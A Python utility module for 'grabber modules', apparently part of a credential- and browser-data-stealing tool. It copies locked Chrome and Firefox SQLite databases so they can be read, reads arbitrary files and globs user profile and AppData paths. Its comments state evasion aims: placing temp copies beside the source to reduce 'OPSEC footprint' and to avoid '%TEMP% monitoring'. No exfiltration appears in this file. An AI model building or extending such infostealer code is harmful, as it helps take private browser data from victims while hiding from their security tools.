"""Shared utilities for grabber modules."""

from __future__ import annotations

import logging
import os
import shutil
import sqlite3
import tempfile

logger = logging.getLogger(__name__)


def safe_sqlite_read(db_path: str) -> tuple[sqlite3.Connection, str] | None:
    """Copy a potentially-locked SQLite DB to a temp location and open it.

    Chrome/Firefox lock their DBs while running. This copies the file first,
    then opens the copy. The temp file is created in the same directory as
    the source to avoid cross-volume issues and reduce OPSEC footprint.

    Returns (connection, tmp_path) tuple or None on failure.
    Call safe_sqlite_close(conn, tmp_path) when done.
    """
    if not os.path.exists(db_path):
        return None

    tmp_path = ""
    try:
        # Create temp in same directory (avoids %TEMP% monitoring, stays same volume)
        src_dir = os.path.dirname(db_path)
        fd, tmp_path = tempfile.mkstemp(suffix=".tmp", dir=src_dir)
        os.close(fd)

        shutil.copy2(db_path, tmp_path)
        conn = sqlite3.connect(tmp_path)
        conn.row_factory = sqlite3.Row
        return conn, tmp_path

    except (OSError, sqlite3.Error) as e:
        logger.debug(f"safe_sqlite_read failed for {db_path}: {e}")
        try:
            if tmp_path and os.path.exists(tmp_path):
                os.unlink(tmp_path)
        except OSError:
            pass
        return None


def safe_sqlite_close(conn: sqlite3.Connection, tmp_path: str = "") -> None:
    """Close connection and delete the temporary copy."""
    try:
        conn.close()
    except Exception:
        pass

    try:
        if tmp_path and os.path.exists(tmp_path):
            os.unlink(tmp_path)
    except OSError:
        pass


def safe_read_text(file_path: str, max_size: int = 10 * 1024 * 1024) -> str | None:
    """Read a text file safely, returning None on failure.

    Limits read size to prevent memory issues on huge files.
    """
    try:
        if not os.path.exists(file_path):
            return None
        if os.path.getsize(file_path) > max_size:
            return None
        with open(file_path, "r", encoding="utf-8-sig", errors="ignore") as f:
            return f.read(max_size)
    except (OSError, ValueError):
        return None


def safe_read_binary(file_path: str, max_size: int = 10 * 1024 * 1024) -> bytes | None:
    """Read a binary file safely, returning None on failure."""
    try:
        if not os.path.exists(file_path):
            return None
        if os.path.getsize(file_path) > max_size:
            return None
        with open(file_path, "rb") as f:
            return f.read(max_size)
    except OSError:
        return None


def expand_user_path(template: str, context: "GrabberContext") -> str:
    """Expand a path template with environment-detected user paths.

    Supports placeholders: {profile}, {appdata}, {localappdata}, {programdata}, {home}
    """
    from .base import GrabberContext  # avoid circular import

    return template.format(
        profile=context.user_profile_path,
        appdata=context.appdata_roaming,
        localappdata=context.appdata_local,
        programdata=context.programdata,
        home=context.user_profile_path,
    )


def glob_paths(patterns: list[str], context: "GrabberContext") -> list[str]:
    """Expand path templates and glob for matching files.

    Returns list of existing file paths matching any of the patterns.
    """
    import glob as glob_module

    results = []
    for pattern in patterns:
        expanded = expand_user_path(pattern, context)
        try:
            matches = glob_module.glob(expanded)
            results.extend(m for m in matches if os.path.isfile(m))
        except (OSError, ValueError):
            continue
    return results
